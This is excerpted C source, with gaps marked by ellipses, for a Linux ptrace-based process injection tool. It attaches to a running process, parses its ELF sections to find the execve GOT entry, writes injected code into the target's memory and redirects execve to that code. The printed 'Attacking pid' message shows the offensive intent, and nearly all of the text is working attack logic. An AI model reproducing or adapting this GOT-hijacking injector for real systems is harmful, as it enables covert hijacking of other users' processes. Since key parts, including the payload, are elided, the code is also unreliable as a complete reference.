...
#define STACKEXECVEPATCH        0xbf930000+(92*1024)	/* Was that way... someday before. */
//#define STACKEXECVEPATCH	0xbfffffff
#define MAXPATHSIZE             256
#define PREPAREINJECTSIZE	16
#define EXECVEINJECTSIZE	200
#define EXECVECODE		0xdeadcafe	/* auto-replace that with the execve real addr */
...
{
	int elffd, currheader=0, currsymbyte=0, readed=0, pid, pathread, prepinjectfd, injectcount, *peekpoint;
	unsigned int dt_pltgot, dt_rel, dt_relent, dt_relsz, dt_symtab, dt_syment, execveaddr=0xDEADCAFE, mallocaddr=0xDEADCAFE, injectaddr, *peekbuf, execvegot, execvegot1, execvegot2, execverealaddr;
	...
	if (!(peekbuf = malloc(MAXPATHSIZE))) exit(0);
	
	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL))
	{
		perror("error at the initial ptrace()");
		exit(-1);
	}
	for(pathread=0;pathread<MAXPATHSIZE/4;pathread++)
	{
		/* WARNING: this is needed because if we do many PTRACE_PEEKDATAs in a row, there's a high chance they'll fail for whatever weird reason it is (running 2.6.0-test9 ATM) */ 
		do
		{
			errno = 0;
		...
		while (errno);
//		sched_yield();	/* it seems doing that stops peekdata failing every now and then (and slows everything down) */
	}
	...
	printf("Attacking pid %d, its binary seems to be %s\n", pid, path);
	...
	while(currheader<elfheader->e_shnum && sectionheader->sh_type!=11); /* SHT_DYNSYM = 11 next line too*/
	if(sectionheader->sh_type!=11) //11 for syndym
	...
	// Alternate method, since .dynsym isn't as useful anymore.
	
	execveaddr = 0xDEAD1337;
	mallocaddr = 0xCAFE1337;
	...
	while(currheader<elfheader->e_shnum && sectionheader->sh_type!=9); /* SHT_DYNSYM = 11 next line too*/
	...
	if(sectionheader->sh_type!=9) //11 for syndym
		printf("This ELF doesn't have .dynsym. Maybe it's static.\n");
	//symheader = malloc(16); /* 16 = sizeof(Elf32_Sym); */
	//symname = malloc(32); /* 32 por poner algo */
	symname[31] = 0;
...
//		printf("PEEKED: 0x%.8x at 0x%.8x\n", peekbuf[injectcount],regs.eip+injectcount);
	...
	regsinject.eax = EXECVEINJECTSIZE;
...
//		printf("POKED: 0x%.8x at 0x%.8x\n", peekbuf[injectcount],regs.eip+injectcount);
	...
	execvegot1 = ptrace(PTRACE_PEEKDATA, pid, execveaddr, NULL);
	execvegot2 = ptrace(PTRACE_PEEKDATA, pid, execveaddr+4, NULL);
	execvegot = ((execvegot1&0xFFFF0000)>>16)|((execvegot2&0x0000FFFF)<<16);

	printf("execve GOT entryaddr: 0x%.8x\n", execvegot);

	execverealaddr = ptrace(PTRACE_PEEKDATA, pid, execvegot, NULL);
	
	printf("execve addr from GOT: 0x%.8x\n", execverealaddr);
	
	for (injectcount=0; injectcount<EXECVEINJECTSIZE; injectcount+=4)
	{
		sched_yield(); //FIXME
		if (*(int*)(execveinject+injectcount) != EXECVECODE)
			ptrace(PTRACE_POKEDATA, pid, injectaddr+injectcount, *(int*)(execveinject+injectcount));
		else
			ptrace(PTRACE_POKEDATA, pid, injectaddr+injectcount, execverealaddr);
		printf("POKED: 0x%.8x at 0x%.8x\n", *(int*)(execveinject+injectcount),injectaddr+injectcount);
	}
	
	ptrace(PTRACE_POKEDATA, pid, execvegot, injectaddr);
